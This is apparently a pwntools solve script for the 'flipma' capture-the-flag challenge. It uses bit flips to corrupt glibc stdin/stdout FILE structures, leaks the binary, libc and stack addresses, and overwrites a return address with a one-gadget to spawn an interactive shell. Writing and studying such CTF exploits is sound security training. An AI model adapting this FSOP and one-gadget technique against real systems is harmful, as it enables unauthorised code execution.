#!/usr/bin/env python3

from pwn import *

exe = ELF("./flipma")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.31.so")

serv = "chall.lac.tf"
port = 31165

context.binary = exe

def conn():
    if args.REMOTE:
        r = remote(serv, port)
    else:
        r = process([exe.path])
        if args.GDB:
            gdb.attach(r, gdbscript="""
                b *$pie+0x1351
            """)
    return r

r = conn()

def flip(a, b):
    r.sendlineafter(b"a:", str(a).encode())
    r.sendlineafter(b"b:", str(b).encode())

def absflip(a, b):
    flip(a-libc.sym._IO_2_1_stdin_, b)

def leak():
    r.sendlineafter(b"a:", b"69")
    r.sendlineafter(b"b:", b"69")

def write(a, old, new):
    for i in range(8):
        for j in range(8):
            if (old >> (i*8+j)) & 1 != (new >> (i*8+j)) & 1:
                absflip(a+i, j)

def main():
    # leak base with fsop
    flags = 0xd20
    read_end = flags+0x10
    write_base = flags+0x20
    flip(flags+1, 3)
    flip(write_base+1, 5) 
    flip(read_end+1, 5)
    leak()
    l = r.recvuntil(b"we're")
    exe.address = u64(l[0x89e:0x89e+8])-0x4030
    libc.address = u64(l[0x8e6:0x8e6+8])-0x1f2000
    log.info(f"{hex(exe.address)=}")
    log.info(f"{hex(libc.address)=}")
    # now have infinite flips
    absflip(exe.address+0x4010+2, 0)
    # leak stack with fsop
    # note: this is overkill and could
    # shorten it but whatever it's fine
    write(libc.sym._IO_2_1_stdout_+8, libc.address+0x1ed723, libc.sym.environ+8)
    write(libc.sym._IO_2_1_stdout_+8*2, libc.address+0x1ed723, libc.sym.environ-8)
    write(libc.sym._IO_2_1_stdout_+8*3, libc.address+0x1ed723, libc.sym.environ+8)
    write(libc.sym._IO_2_1_stdout_+8*4, libc.address+0x1ed723, libc.sym.environ-8)
    write(libc.sym._IO_2_1_stdout_+8*5, libc.address+0x1ed723, libc.sym.environ+8)
    write(libc.sym._IO_2_1_stdout_+8*6, libc.address+0x1ed723, libc.sym.environ+8)
    write(libc.sym._IO_2_1_stdout_+8*7, libc.address+0x1ed723, libc.sym.environ+8)
    write(libc.sym._IO_2_1_stdout_+8*8, libc.address+0x1ed724, libc.sym.environ+8)
    leak()
    l = r.recvuntil(b"we're")
    stack = u64(l[9:17])-0x100
    log.info(f"{hex(stack)=}")
    write(stack, libc.address+0x24083, libc.address+0xe3b01)
    absflip(exe.address+0x4010+3, 7)
    r.interactive()

if __name__ == "__main__":
    main()
